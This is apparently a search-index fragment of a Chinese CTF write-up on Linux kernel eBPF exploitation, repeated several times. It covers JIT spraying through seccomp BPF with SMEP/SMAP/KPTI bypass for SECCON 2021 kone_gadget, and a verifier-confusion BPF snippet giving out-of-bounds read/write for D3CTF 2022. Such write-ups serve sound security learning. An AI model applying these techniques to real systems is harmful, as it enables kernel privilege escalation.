__mark_reg32_known(dst_reg, 0); + else + __mark_reg_known_zero(dst_reg); break; } if (alu32) 把这个patch翻译一下： BPF_MOV64_IMM(BPF_REG_0, 0x1337), BPF_MOV64_IMM(BPF_REG_1, 64), BPF_ALU64_REG(BPF_RSH, BPF_REG_0, BPF_REG_1), BPF_EXIT_INSN() 那么，verifier就会认为这个reg0为已知（known）的寄存器，且其值确定为0。但是由于CPU进行右移运算的时候，会把右移位数\u002663，所以实际上CPU执行的运算是0x1337 \u003e\u003e 0。 这里就伪造了一个绕过verifier检查的标量寄存器，我们利用这个标量寄存器和一些指针寄存器进行ALU运算，就造成了越界读写 任意地址读写\r写入array_map_update_elem 、ARRAY_MAP_LOOKUP_ELEM、array_of_map_gen_lookup、array_map_free array_of_map_gen_lookup 有个map类型是BPF_MAP_TYPE_ARRAY_OF_MAPS，它是一个存储map的数组，它的lookup_elem函数会解引用两次 static void *array_of_map_lookup_elem(struct bpf_map *map, void *key) { struct bpf_map **inner_map = array_map_lookup_elem(map, key); if (!inner_map) return NULL; return READ_ONCE(*inner_map); } 把map_lookup_elem改成array_of_map_gen_lookup后，使用 lookup_element时verifier会认为它返回了一个指向map_value的指针，但是实际上返回的东西是用户可以控制的，因为他会再次解引用用户传入的东西 思路流程\r先初始化stack","date":"2026-02-02","objectID":"/posts/kernel_ebpfpwn/:2:0","tags":null,"title":"内核ebpfpwn（未完成版）","uri":"/posts/kernel_ebpfpwn/#d3ctf-2022__d3bpf"},{"categories":["pwn"],"collections":null,"content":"例题\rSEC CON CTF 2021 kone_gadget\rmkdir initramfs cd initramfs cp ../rootfs.cpio . sudo cpio -idm \u003c ./rootfs.cpio rm rootfs.cpio gcc exp.c -static -masm=intel -g -o ./initramfs/exp cd ./initramfs sudo find . | sudo cpio -o --format=newc \u003e../rootfs.cpio cd .. 提供了一个新的系统调用，能控制rip，但是其他寄存器都置0 Added to arch/x86/entry/syscalls/syscall_64.tbl: 1337 64 seccon sys_seccon Added to kernel/sys.c: SYSCALL_DEFINE1(seccon, unsigned long, rip) { asm volatile(\"xor %%edx, %%edx;\" \"xor %%ebx, %%ebx;\" \"xor %%ecx, %%ecx;\" \"xor %%edi, %%edi;\" \"xor %%esi, %%esi;\" \"xor %%r8d, %%r8d;\" \"xor %%r9d, %%r9d;\" \"xor %%r10d, %%r10d;\" \"xor %%r11d, %%r11d;\" \"xor %%r12d, %%r12d;\" \"xor %%r13d, %%r13d;\" \"xor %%r14d, %%r14d;\" \"xor %%r15d, %%r15d;\" \"xor %%ebp, %%ebp;\" \"xor %%esp, %%esp;\" \"jmp %0;\" \"ud2;\" : : \"rax\"(rip)); return 0; } 大概思路就是往内核中写入一个one_gadget，调用它就能提权 同时，题目也禁掉了bpf系统调用 写了个exp: #include #include #include #include int main() { // 尝试调用 bpf 系统调用 long ret = syscall(321, 0, 0, 0); // 321 是 x64 下 bpf 的调用号 if (ret == -1 \u0026\u0026 errno == ENOSYS) { printf(\"内核不支持该系统调用 (ENOSYS)\\n\"); } else { printf(\"内核支持该系统调用，返回值为: %ld\\n\", ret); } return 0; } / $ ./exp 内核不支持该系统调用 (ENOSYS) / # cat /proc/sys/net/core/bpf_jit_enable 1 来自AI： 如果是： 2 → 致盲开启，老套路基本死 1 → 还能打 0 → 先想办法打开 JIT 没开致盲 但是，平时我们自定义的沙箱规则其实就是一段bpf程序，它会被写入内核空间中。 所以，思路就是使用prctl写入一段bpf程序到内核中，调用seccon系统调用，控制rip执行这段我们自定义的程序来提权 程序怎么写？ 怎么执行到这段程序？ 编写shellcode\r开了smep、smap保护，需要写cr4寄存器为0x6f0来绕过 开了kpti，通过执行swapgs_restore_regs_and_return_to_usermode，切换页表后返回用户态提权 写入的指令需要是ebpf格式，经过jit编译后，是x86指令 这里两篇参考文章构造的ebpf指令格式都是，p32(0)+p32(A)，经过jit编译后他会变成0xb8+p32(A)存入内存中 这里的ebpf指令的opcode被设置为0，其实是设置成了BPF_LD | BPF_IMM | BPF_W，也就是ldw pwndbg\u003e x/32b 0xffffffffc00005d0 0xffffffffc00005d0: 0x48 0x89 0xc7 0x04 0xb8 0x58 0x90 0xeb 0xffffffffc00005d8: 0x01 0xb8 0xff 0xd0 0xeb 0x01 0xb8 0x58 0xffffffffc00005e0: 0x90 0xeb 0x01 0xb8 0xff 0xe0 0xeb 0x01 0xffffffffc00005e8: 0xb8 0x90 0x90 0xeb 0x01 0xb8 0x90 0x90 每两个A直接间隔一个0xb8，跳过0xb8的思路有两种： 写A中的一个字节为0x3c和0xb8组成 cmp al, 0xb8： 内存 x86 0xb0 0x12 mov al, 0x12 0x90 nop 0x3c 0xb8 cmp al, 0xb8 ;用0x3c吃掉一个0xb8 0xb4 0x34 mov ah, 0x34 0x90 nop 0x3c ... ... ;继续吃掉下一个0xb8 写A中的两个字节为0xeb 0x01（PC = PC+1），来跳过0xb8 内存 x86 0xb0 0x12 mov al, 0x12 0xeb 0x01 jmp $+3 ;直接过0xb8, 进入mov ah, 0x34, 效果等价于PC = PC+1 0xb8 0xb4 0x34 mov ah, 0x34 0xeb 0x01 jmp $+3 ... 参考文章1用的是思路1(但是打不通，不知道为什么)，参考文章2用的是思路2 D^3CTF 2022__d3bpf\r内核ebpf 这里的bzImage可以直接用vmlinux-to-elf提取 patch后，如果对一个寄存器右移的位数大于insn_bitness（ALU32运算为32，ALU64为64），则verifier认为该寄存器全部bit已知（补充：指针不可以与标记为unknown的寄存器进行ALU运算），且verifier认为其值为0 diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c index 37581919e..8e98d4af5 100644 --- a/kernel/bpf/verifier.c +++ b/kernel/bpf/verifier.c @@ -6455,11 +6455,11 @@ static int adjust_scalar_min_max_vals(struct bpf_verifier_env *env, scalar_min_max_lsh(dst_reg, \u0026src_reg); break; case BPF_RSH: - if (umax_val \u003e= insn_bitness) { - /* Shifts greater than 31 or 63 are undefined. - * This includes shifts by a negative number. - */ - mark_reg_unknown(env, regs, insn-\u003edst_reg); + if (umin_val \u003e= insn_bitness) { + if (alu32) + __mark_reg32_known(dst_reg, 0); + else + __mark_reg_known_zero(dst_reg); break; } if (alu32) 把这个patch翻译一下： BPF_MOV64_IMM(BPF_REG_0, 0x1337), BPF_MOV64_IMM(BPF_REG_1, 64), BPF_ALU64_REG(BPF_RSH, BPF_REG_0, BPF_REG_1), BPF_EXIT_INSN() 那么，verifier就会认为这个reg0为已知（known）的寄存器，且其值确定为0。但是由于CPU进行右移运算的时候，会把右移位数\u002663，所以实际上CPU执行的运算是0x1337 \u003e\u003e 0。 这里就伪造了一个绕过verifier检查的标量寄存器，我们利用这个标量寄存器和一些指针寄存器进行ALU运算，就造成了越界读写 任意地址读写\r写入array_map_update_elem 、ARRAY_MAP_LOOKUP_ELEM、array_of_map_gen_lookup、array_map_free array_of_map_gen_lookup 有个map类型是BPF_MAP_TYPE_ARRAY_OF_MAPS，它是一个存储map的数组，它的lookup_elem函数会解引用两次 static void *array_of_map_lookup_elem(struct bpf_map *map, void *key) { struct bpf_map **inner_map = array_map_lookup_elem(map, key); if (!inner_map) return NULL; return READ_ONCE(*inner_map); } 把map_lookup_elem改成array_of_map_gen_lookup后，使用 lookup_element时verifier会认为它返回了一个指向map_value的指针，但是实际上返回的东西是用户可以控制的，因为他会再次解引用用户传入的东西 思路流程\r先初始化stack","date":"2026-02-02","objectID":"/posts/kernel_ebpfpwn/:2:0","tags":null,"title":"内核ebpfpwn（未完成版）","uri":"/posts/kernel_ebpfpwn/#任意地址读写"},{"categories":["pwn"],"collections":null,"content":"例题\rSEC CON CTF 2021 kone_gadget\rmkdir initramfs cd initramfs cp ../rootfs.cpio . sudo cpio -idm \u003c ./rootfs.cpio rm rootfs.cpio gcc exp.c -static -masm=intel -g -o ./initramfs/exp cd ./initramfs sudo find . | sudo cpio -o --format=newc \u003e../rootfs.cpio cd .. 提供了一个新的系统调用，能控制rip，但是其他寄存器都置0 Added to arch/x86/entry/syscalls/syscall_64.tbl: 1337 64 seccon sys_seccon Added to kernel/sys.c: SYSCALL_DEFINE1(seccon, unsigned long, rip) { asm volatile(\"xor %%edx, %%edx;\" \"xor %%ebx, %%ebx;\" \"xor %%ecx, %%ecx;\" \"xor %%edi, %%edi;\" \"xor %%esi, %%esi;\" \"xor %%r8d, %%r8d;\" \"xor %%r9d, %%r9d;\" \"xor %%r10d, %%r10d;\" \"xor %%r11d, %%r11d;\" \"xor %%r12d, %%r12d;\" \"xor %%r13d, %%r13d;\" \"xor %%r14d, %%r14d;\" \"xor %%r15d, %%r15d;\" \"xor %%ebp, %%ebp;\" \"xor %%esp, %%esp;\" \"jmp %0;\" \"ud2;\" : : \"rax\"(rip)); return 0; } 大概思路就是往内核中写入一个one_gadget，调用它就能提权 同时，题目也禁掉了bpf系统调用 写了个exp: #include #include #include #include int main() { // 尝试调用 bpf 系统调用 long ret = syscall(321, 0, 0, 0); // 321 是 x64 下 bpf 的调用号 if (ret == -1 \u0026\u0026 errno == ENOSYS) { printf(\"内核不支持该系统调用 (ENOSYS)\\n\"); } else { printf(\"内核支持该系统调用，返回值为: %ld\\n\", ret); } return 0; } / $ ./exp 内核不支持该系统调用 (ENOSYS) / # cat /proc/sys/net/core/bpf_jit_enable 1 来自AI： 如果是： 2 → 致盲开启，老套路基本死 1 → 还能打 0 → 先想办法打开 JIT 没开致盲 但是，平时我们自定义的沙箱规则其实就是一段bpf程序，它会被写入内核空间中。 所以，思路就是使用prctl写入一段bpf程序到内核中，调用seccon系统调用，控制rip执行这段我们自定义的程序来提权 程序怎么写？ 怎么执行到这段程序？ 编写shellcode\r开了smep、smap保护，需要写cr4寄存器为0x6f0来绕过 开了kpti，通过执行swapgs_restore_regs_and_return_to_usermode，切换页表后返回用户态提权 写入的指令需要是ebpf格式，经过jit编译后，是x86指令 这里两篇参考文章构造的ebpf指令格式都是，p32(0)+p32(A)，经过jit编译后他会变成0xb8+p32(A)存入内存中 这里的ebpf指令的opcode被设置为0，其实是设置成了BPF_LD | BPF_IMM | BPF_W，也就是ldw pwndbg\u003e x/32b 0xffffffffc00005d0 0xffffffffc00005d0: 0x48 0x89 0xc7 0x04 0xb8 0x58 0x90 0xeb 0xffffffffc00005d8: 0x01 0xb8 0xff 0xd0 0xeb 0x01 0xb8 0x58 0xffffffffc00005e0: 0x90 0xeb 0x01 0xb8 0xff 0xe0 0xeb 0x01 0xffffffffc00005e8: 0xb8 0x90 0x90 0xeb 0x01 0xb8 0x90 0x90 每两个A直接间隔一个0xb8，跳过0xb8的思路有两种： 写A中的一个字节为0x3c和0xb8组成 cmp al, 0xb8： 内存 x86 0xb0 0x12 mov al, 0x12 0x90 nop 0x3c 0xb8 cmp al, 0xb8 ;用0x3c吃掉一个0xb8 0xb4 0x34 mov ah, 0x34 0x90 nop 0x3c ... ... ;继续吃掉下一个0xb8 写A中的两个字节为0xeb 0x01（PC = PC+1），来跳过0xb8 内存 x86 0xb0 0x12 mov al, 0x12 0xeb 0x01 jmp $+3 ;直接过0xb8, 进入mov ah, 0x34, 效果等价于PC = PC+1 0xb8 0xb4 0x34 mov ah, 0x34 0xeb 0x01 jmp $+3 ... 参考文章1用的是思路1(但是打不通，不知道为什么)，参考文章2用的是思路2 D^3CTF 2022__d3bpf\r内核ebpf 这里的bzImage可以直接用vmlinux-to-elf提取 patch后，如果对一个寄存器右移的位数大于insn_bitness（ALU32运算为32，ALU64为64），则verifier认为该寄存器全部bit已知（补充：指针不可以与标记为unknown的寄存器进行ALU运算），且verifier认为其值为0 diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c index 37581919e..8e98d4af5 100644 --- a/kernel/bpf/verifier.c +++ b/kernel/bpf/verifier.c @@ -6455,11 +6455,11 @@ static int adjust_scalar_min_max_vals(struct bpf_verifier_env *env, scalar_min_max_lsh(dst_reg, \u0026src_reg); break; case BPF_RSH: - if (umax_val \u003e= insn_bitness) { - /* Shifts greater than 31 or 63 are undefined. - * This includes shifts by a negative number. - */ - mark_reg_unknown(env, regs, insn-\u003edst_reg); + if (umin_val \u003e= insn_bitness) { + if (alu32) + __mark_reg32_known(dst_reg, 0); + else + __mark_reg_known_zero(dst_reg); break; } if (alu32) 把这个patch翻译一下： BPF_MOV64_IMM(BPF_REG_0, 0x1337), BPF_MOV64_IMM(BPF_REG_1, 64), BPF_ALU64_REG(BPF_RSH, BPF_REG_0, BPF_REG_1), BPF_EXIT_INSN() 那么，verifier就会认为这个reg0为已知（known）的寄存器，且其值确定为0。但是由于CPU进行右移运算的时候，会把右移位数\u002663，所以实际上CPU执行的运算是0x1337 \u003e\u003e 0。 这里就伪造了一个绕过verifier检查的标量寄存器，我们利用这个标量寄存器和一些指针寄存器进行ALU运算，就造成了越界读写 任意地址读写\r写入array_map_update_elem 、ARRAY_MAP_LOOKUP_ELEM、array_of_map_gen_lookup、array_map_free array_of_map_gen_lookup 有个map类型是BPF_MAP_TYPE_ARRAY_OF_MAPS，它是一个存储map的数组，它的lookup_elem函数会解引用两次 static void *array_of_map_lookup_elem(struct bpf_map *map, void *key) { struct bpf_map **inner_map = array_map_lookup_elem(map, key); if (!inner_map) return NULL; return READ_ONCE(*inner_map); } 把map_lookup_elem改成array_of_map_gen_lookup后，使用 lookup_element时verifier会认为它返回了一个指向map_value的指针，但是实际上返回的东西是用户可以控制的，因为他会再次解引用用户传入的东西 思路流程\r先初始化stack","date":"2026-02-02","objectID":"/posts/kernel_ebpfpwn/:2:0","tags":null,"title":"内核ebpfpwn（未完成版）","uri":"/posts/kernel_ebpfpwn/#思路流程"},{"categories":["pwn"],"collections":null,"content":"例题\rSEC CON CTF 2021 kone_gadget\rmkdir initramfs cd initramfs cp ../rootfs.cpio . sudo cpio -idm \u003c ./rootfs.cpio rm rootfs.cpio gcc exp.c -static -masm=intel -g -o ./initramfs/exp cd ./initramfs sudo find . | sudo cpio -o --format=newc \u003e../rootfs.cpio cd .. 提供了一个新的系统调用，能控制rip，但是其他寄存器都置0 Added to arch/x86/entry/syscalls/syscall_64.tbl: 1337 64 seccon sys_seccon Added to kernel/sys.c: SYSCALL_DEFINE1(seccon, unsigned long, rip) { asm volatile(\"xor %%edx, %%edx;\" \"xor %%ebx, %%ebx;\" \"xor %%ecx, %%ecx;\" \"xor %%edi, %%edi;\" \"xor %%esi, %%esi;\" \"xor %%r8d, %%r8d;\" \"xor %%r9d, %%r9d;\" \"xor %%r10d, %%r10d;\" \"xor %%r11d, %%r11d;\" \"xor %%r12d, %%r12d;\" \"xor %%r13d, %%r13d;\" \"xor %%r14d, %%r14d;\" \"xor %%r15d, %%r15d;\" \"xor %%ebp, %%ebp;\" \"xor %%esp, %%esp;\" \"jmp %0;\" \"ud2;\" : : \"rax\"(rip)); return 0; } 大概思路就是往内核中写入一个one_gadget，调用它就能提权 同时，题目也禁掉了bpf系统调用 写了个exp: #include #include #include #include int main() { // 尝试调用 bpf 系统调用 long ret = syscall(321, 0, 0, 0); // 321 是 x64 下 bpf 的调用号 if (ret == -1 \u0026\u0026 errno == ENOSYS) { printf(\"内核不支持该系统调用 (ENOSYS)\\n\"); } else { printf(\"内核支持该系统调用，返回值为: %ld\\n\", ret); } return 0; } / $ ./exp 内核不支持该系统调用 (ENOSYS) / # cat /proc/sys/net/core/bpf_jit_enable 1 来自AI： 如果是： 2 → 致盲开启，老套路基本死 1 → 还能打 0 → 先想办法打开 JIT 没开致盲 但是，平时我们自定义的沙箱规则其实就是一段bpf程序，它会被写入内核空间中。 所以，思路就是使用prctl写入一段bpf程序到内核中，调用seccon系统调用，控制rip执行这段我们自定义的程序来提权 程序怎么写？ 怎么执行到这段程序？ 编写shellcode\r开了smep、smap保护，需要写cr4寄存器为0x6f0来绕过 开了kpti，通过执行swapgs_restore_regs_and_return_to_usermode，切换页表后返回用户态提权 写入的指令需要是ebpf格式，经过jit编译后，是x86指令 这里两篇参考文章构造的ebpf指令格式都是，p32(0)+p32(A)，经过jit编译后他会变成0xb8+p32(A)存入内存中 这里的ebpf指令的opcode被设置为0，其实是设置成了BPF_LD | BPF_IMM | BPF_W，也就是ldw pwndbg\u003e x/32b 0xffffffffc00005d0 0xffffffffc00005d0: 0x48 0x89 0xc7 0x04 0xb8 0x58 0x90 0xeb 0xffffffffc00005d8: 0x01 0xb8 0xff 0xd0 0xeb 0x01 0xb8 0x58 0xffffffffc00005e0: 0x90 0xeb 0x01 0xb8 0xff 0xe0 0xeb 0x01 0xffffffffc00005e8: 0xb8 0x90 0x90 0xeb 0x01 0xb8 0x90 0x90 每两个A直接间隔一个0xb8，跳过0xb8的思路有两种： 写A中的一个字节为0x3c和0xb8组成 cmp al, 0xb8： 内存 x86 0xb0 0x12 mov al, 0x12 0x90 nop 0x3c 0xb8 cmp al, 0xb8 ;用0x3c吃掉一个0xb8 0xb4 0x34 mov ah, 0x34 0x90 nop 0x3c ... ... ;继续吃掉下一个0xb8 写A中的两个字节为0xeb 0x01（PC = PC+1），来跳过0xb8 内存 x86 0xb0 0x12 mov al, 0x12 0xeb 0x01 jmp $+3 ;直接过0xb8, 进入mov ah, 0x34, 效果等价于PC = PC+1 0xb8 0xb4 0x34 mov ah, 0x34 0xeb 0x01 jmp $+3 ... 参考文章1用的是思路1(但是打不通，不知道为什么)，参考文章2用的是思路2 D^3CTF 2022__d3bpf\r内核ebpf 这里的bzImage可以直接用vmlinux-to-elf提取 patch后，如果对一个寄存器右移的位数大于insn_bitness（ALU32运算为32，ALU64为64），则verifier认为该寄存器全部bit已知（补充：指针不可以与标记为unknown的寄存器进行ALU运算），且verifier认为其值为0 diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c index 37581919e..8e98d4af5 100644 --- a/kernel/bpf/verifier.c +++ b/kernel/bpf/verifier.c @@ -6455,11 +6455,11 @@ static int adjust_scalar_min_max_vals(struct bpf_verifier_env *env, scalar_min_max_lsh(dst_reg, \u0026src_reg); break; case BPF_RSH: - if (umax_val \u003e= insn_bitness) { - /* Shifts greater than 31 or 63 are undefined. - * This includes shifts by a negative number. - */ - mark_reg_unknown(env, regs, insn-\u003edst_reg); + if (umin_val \u003e= insn_bitness) { + if (alu32) + __mark_reg32_known(dst_reg, 0); + else + __mark_reg_known_zero(dst_reg); break; } if (alu32) 把这个patch翻译一下： BPF_MOV64_IMM(BPF_REG_0, 0x1337), BPF_MOV64_IMM(BPF_REG_1, 64), BPF_ALU64_REG(BPF_RSH, BPF_REG_0, BPF_REG_1), BPF_EXIT_INSN() 那么，verifier就会认为这个reg0为已知（known）的寄存器，且其值确定为0。但是由于CPU进行右移运算的时候，会把右移位数\u002663，所以实际上CPU执行的运算是0x1337 \u003e\u003e 0。 这里就伪造了一个绕过verifier检查的标量寄存器，我们利用这个标量寄存器和一些指针寄存器进行ALU运算，就造成了越界读写 任意地址读写\r写入array_map_update_elem 、ARRAY_MAP_LOOKUP_ELEM、array_of_map_gen_lookup、array_map_free array_of_map_gen_lookup 有个map类型是BPF_MAP_TYPE_ARRAY_OF_MAPS，它是一个存储map的数组，它的lookup_elem函数会解引用两次 static void *array_of_map_lookup_elem(struct bpf_map *map, void *key) { struct bpf_map **inner_map = array_map_lookup_elem(map, key); if (!inner_map) return NULL; return READ_ONCE(*inner_map); } 把map_lookup_elem改成array_of_map_gen_lookup后，使用 lookup_element时verifier会认为它返回了一个指向map_value的指针，但是实际上返回的东西是用户可以控制的，因为他会再次解引用用户传入的东西 思路流程\r先初始化stack","date":"2026-02-02","objectID":"/posts/kernel_ebpfpwn/:2:0","tags":null,"title":"内核ebpfpwn（未完成版）","uri":"/posts/kernel_ebpfpwn/#exp"},{"categories":["pwn"],"collections":null,"content":"例题\rSEC CON CTF 2021 kone_gadget\rmkdir initramfs cd initramfs cp ../rootfs.cpio . sudo cpio -idm \u003c ./rootfs.cpio rm rootfs.cpio gcc exp.c -static -masm=intel -g -o ./initramfs/exp cd ./initramfs sudo find . | sudo cpio -o --format=newc \u003e../rootfs.cpio cd .. 提供了一个新的系统调用，能控制rip，但是其他寄存器都置0 Added to arch/x86/entry/syscalls/syscall_64.tbl: 1337 64 seccon sys_seccon Added to kernel/sys.c: SYSCALL_DEFINE1(seccon, unsigned long, rip) { asm volatile(\"xor %%edx, %%edx;\" \"xor %%ebx, %%ebx;\" \"xor %%ecx, %%ecx;\" \"xor %%edi, %%edi;\" \"xor %%esi, %%esi;\" \"xor %%r8d, %%r8d;\" \"xor %%r9d, %%r9d;\" \"xor %%r10d, %%r10d;\" \"xor %%r11d, %%r11d;\" \"xor %%r12d, %%r12d;\" \"xor %%r13d, %%r13d;\" \"xor %%r14d, %%r14d;\" \"xor %%r15d, %%r15d;\" \"xor %%ebp, %%ebp;\" \"xor %%esp, %%esp;\" \"jmp %0;\" \"ud2;\" : : \"rax\"(rip)); return 0; } 大概思路就是往内核中写入一个one_gadget，调用它就能提权 同时，题目也禁掉了bpf系统调用 写了个exp: #include #include #include #include int main() { // 尝试调用 bpf 系统调用 long ret = syscall(321, 0, 0, 0); // 321 是 x64 下 bpf 的调用号 if (ret == -1 \u0026\u0026 errno == ENOSYS) { printf(\"内核不支持该系统调用 (ENOSYS)\\n\"); } else { printf(\"内核支持该系统调用，返回值为: %ld\\n\", ret); } return 0; } / $ ./exp 内核不支持该系统调用 (ENOSYS) / # cat /proc/sys/net/core/bpf_jit_enable 1 来自AI： 如果是： 2 → 致盲开启，老套路基本死 1 → 还能打 0 → 先想办法打开 JIT 没开致盲 但是，平时我们自定义的沙箱规则其实就是一段bpf程序，它会被写入内核空间中。 所以，思路就是使用prctl写入一段bpf程序到内核中，调用seccon系统调用，控制rip执行这段我们自定义的程序来提权 程序怎么写？ 怎么执行到这段程序？ 编写shellcode\r开了smep、smap保护，需要写cr4寄存器为0x6f0来绕过 开了kpti，通过执行swapgs_restore_regs_and_return_to_usermode，切换页表后返回用户态提权 写入的指令需要是ebpf格式，经过jit编译后，是x86指令 这里两篇参考文章构造的ebpf指令格式都是，p32(0)+p32(A)，经过jit编译后他会变成0xb8+p32(A)存入内存中 这里的ebpf指令的opcode被设置为0，其实是设置成了BPF_LD | BPF_IMM | BPF_W，也就是ldw pwndbg\u003e x/32b 0xffffffffc00005d0 0xffffffffc00005d0: 0x48 0x89 0xc7 0x04 0xb8 0x58 0x90 0xeb 0xffffffffc00005d8: 0x01 0xb8 0xff 0xd0 0xeb 0x01 0xb8 0x58 0xffffffffc00005e0: 0x90 0xeb 0x01 0xb8 0xff 0xe0 0xeb 0x01 0xffffffffc00005e8: 0xb8 0x90 0x90 0xeb 0x01 0xb8 0x90 0x90 每两个A直接间隔一个0xb8，跳过0xb8的思路有两种： 写A中的一个字节为0x3c和0xb8组成 cmp al, 0xb8： 内存 x86 0xb0 0x12 mov al, 0x12 0x90 nop 0x3c 0xb8 cmp al, 0xb8 ;用0x3c吃掉一个0xb8 0xb4 0x34 mov ah, 0x34 0x90 nop 0x3c ... ... ;继续吃掉下一个0xb8 写A中的两个字节为0xeb 0x01（PC = PC+1），来跳过0xb8 内存 x86 0xb0 0x12 mov al, 0x12 0xeb 0x01 jmp $+3 ;直接过0xb8, 进入mov ah, 0x34, 效果等价于PC = PC+1 0xb8 0xb4 0x34 mov ah, 0x34 0xeb 0x01 jmp $+3 ... 参考文章1用的是思路1(但是打不通，不知道为什么)，参考文章2用的是思路2 D^3CTF 2022__d3bpf\r内核ebpf 这里的bzImage可以直接用vmlinux-to-elf提取 patch后，如果对一个寄存器右移的位数大于insn_bitness（ALU32运算为32，ALU64为64），则verifier认为该寄存器全部bit已知（补充：指针不可以与标记为unknown的寄存器进行ALU运算），且verifier认为其值为0 diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c index 37581919e..8e98d4af5 100644 --- a/kernel/bpf/verifier.c +++ b/kernel/bpf/verifier.c @@ -6455,11 +6455,11 @@ static int adjust_scalar_min_max_vals(struct bpf_verifier_env *env, scalar_min_max_lsh(dst_reg, \u0026src_reg); break; case BPF_RSH: - if (umax_val \u003e= insn_bitness) { - /* Shifts greater than 31 or 63 are undefined. - * This includes shifts by a negative number. - */ - mark_reg_unknown(env, regs, insn-\u003edst_reg); + if (umin_val \u003e= insn_bitness) { + if (alu32) + __mark_reg32_known(dst_reg, 0); + else + __mark_reg_known_zero(dst_reg); break; } if (alu32) 把这个patch翻译一下： BPF_MOV64_IMM(BPF_REG_0, 0x1337), BPF_MOV64_IMM(BPF_REG_1, 64), BPF_ALU64_REG(BPF_RSH, BPF_REG_0, BPF_REG_1), BPF_EXIT_INSN() 那么，verifier就会认为这个reg0为已知（known）的寄存器，且其值确定为0。但是由于CPU进行右移运算的时候，会把右移位数\u002663，所以实际上CPU执行的运算是0x1337 \u003e\u003e 0。 这里就伪造了一个绕过verifier检查的标量寄存器，我们利用这个标量寄存器和一些指针寄存器进行ALU运算，就造成了越界读写 任意地址读写\r写入array_map_update_elem 、ARRAY_MAP_LOOKUP_ELEM、array_of_map_gen_lookup、array_map_free array_of_map_gen_lookup 有个map类型是BPF_MAP_TYPE_ARRAY_OF_MAPS，它是一个存储map的数组，它的lookup_elem函数会解引用两次 static void *array_of_map_lookup_elem(struct bpf_map *map, void *key) { struct bpf_map **inner_map = array_map_lookup_elem(map, key); if (!inner_map) return NULL; return READ_ONCE(*inner_map); } 把map_lookup_elem改成array_of_map_gen_lookup后，使用 lookup_element时verifier会认为它返回了一个指向map_value的指针，但是实际上返回的东西是用户可以控制的，因为他会再次解引用用户传入的东西 思路流程\r先初始化stack","date":"2026-02-02","objectID":"/posts/kernel_ebpfpwn/:2:0","tags":null,"title":"内核ebpfpwn（未完成版）","uri":"/posts/kernel_ebpfpwn/#d3ctf-2022__d3bpf-v2"},{"categories":["pwn"],"collections":null,"content":"例题\rSEC CON CTF 2021 kone_gadget\rmkdir initramfs cd initramfs cp ../rootfs.cpio . sudo cpio -idm \u003c ./rootfs.cpio rm rootfs.cpio gcc exp.c -static -masm=intel -g -o ./initramfs/exp cd ./initramfs sudo find . | sudo cpio -o --format=newc \u003e../rootfs.cpio cd .. 提供了一个新的系统调用，能控制rip，但是其他寄存器都置0 Added to arch/x86/entry/syscalls/syscall_64.tbl: 1337 64 seccon sys_seccon Added to kernel/sys.c: SYSCALL_DEFINE1(seccon, unsigned long, rip) { asm volatile(\"xor %%edx, %%edx;\" \"xor %%ebx, %%ebx;\" \"xor %%ecx, %%ecx;\" \"xor %%edi, %%edi;\" \"xor %%esi, %%esi;\" \"xor %%r8d, %%r8d;\" \"xor %%r9d, %%r9d;\" \"xor %%r10d, %%r10d;\" \"xor %%r11d, %%r11d;\" \"xor %%r12d, %%r12d;\" \"xor %%r13d, %%r13d;\" \"xor %%r14d, %%r14d;\" \"xor %%r15d, %%r15d;\" \"xor %%ebp, %%ebp;\" \"xor %%esp, %%esp;\" \"jmp %0;\" \"ud2;\" : : \"rax\"(rip)); return 0; } 大概思路就是往内核中写入一个one_gadget，调用它就能提权 同时，题目也禁掉了bpf系统调用 写了个exp: #include #include #include #include int main() { // 尝试调用 bpf 系统调用 long ret = syscall(321, 0, 0, 0); // 321 是 x64 下 bpf 的调用号 if (ret == -1 \u0026\u0026 errno == ENOSYS) { printf(\"内核不支持该系统调用 (ENOSYS)\\n\"); } else { printf(\"内核支持该系统调用，返回值为: %ld\\n\", ret); } return 0; } / $ ./exp 内核不支持该系统调用 (ENOSYS) / # cat /proc/sys/net/core/bpf_jit_enable 1 来自AI： 如果是： 2 → 致盲开启，老套路基本死 1 → 还能打 0 → 先想办法打开 JIT 没开致盲 但是，平时我们自定义的沙箱规则其实就是一段bpf程序，它会被写入内核空间中。 所以，思路就是使用prctl写入一段bpf程序到内核中，调用seccon系统调用，控制rip执行这段我们自定义的程序来提权 程序怎么写？ 怎么执行到这段程序？ 编写shellcode\r开了smep、smap保护，需要写cr4寄存器为0x6f0来绕过 开了kpti，通过执行swapgs_restore_regs_and_return_to_usermode，切换页表后返回用户态提权 写入的指令需要是ebpf格式，经过jit编译后，是x86指令 这里两篇参考文章构造的ebpf指令格式都是，p32(0)+p32(A)，经过jit编译后他会变成0xb8+p32(A)存入内存中 这里的ebpf指令的opcode被设置为0，其实是设置成了BPF_LD | BPF_IMM | BPF_W，也就是ldw pwndbg\u003e x/32b 0xffffffffc00005d0 0xffffffffc00005d0: 0x48 0x89 0xc7 0x04 0xb8 0x58 0x90 0xeb 0xffffffffc00005d8: 0x01 0xb8 0xff 0xd0 0xeb 0x01 0xb8 0x58 0xffffffffc00005e0: 0x90 0xeb 0x01 0xb8 0xff 0xe0 0xeb 0x01 0xffffffffc00005e8: 0xb8 0x90 0x90 0xeb 0x01 0xb8 0x90 0x90 每两个A直接间隔一个0xb8，跳过0xb8的思路有两种： 写A中的一个字节为0x3c和0xb8组成 cmp al, 0xb8： 内存 x86 0xb0 0x12 mov al, 0x12 0x90 nop 0x3c 0xb8 cmp al, 0xb8 ;用0x3c吃掉一个0xb8 0xb4 0x34 mov ah, 0x34 0x90 nop 0x3c ... ... ;继续吃掉下一个0xb8 写A中的两个字节为0xeb 0x01（PC = PC+1），来跳过0xb8 内存 x86 0xb0 0x12 mov al, 0x12 0xeb 0x01 jmp $+3 ;直接过0xb8, 进入mov ah, 0x34, 效果等价于PC = PC+1 0xb8 0xb4 0x34 mov ah, 0x34 0xeb 0x01 jmp $+3 ... 参考文章1用的是思路1(但是打不通，不知道为什么)，参考文章2用的是思路2 D^3CTF 2022__d3bpf\r内核ebpf 这里的bzImage可以直接用vmlinux-to-elf提取 patch后，如果对一个寄存器右移的位数大于insn_bitness（ALU32运算为32，ALU64为64），则verifier认为该寄存器全部bit已知（补充：指针不可以与标记为unknown的寄存器进行ALU运算），且verifier认为其值为0 diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c index 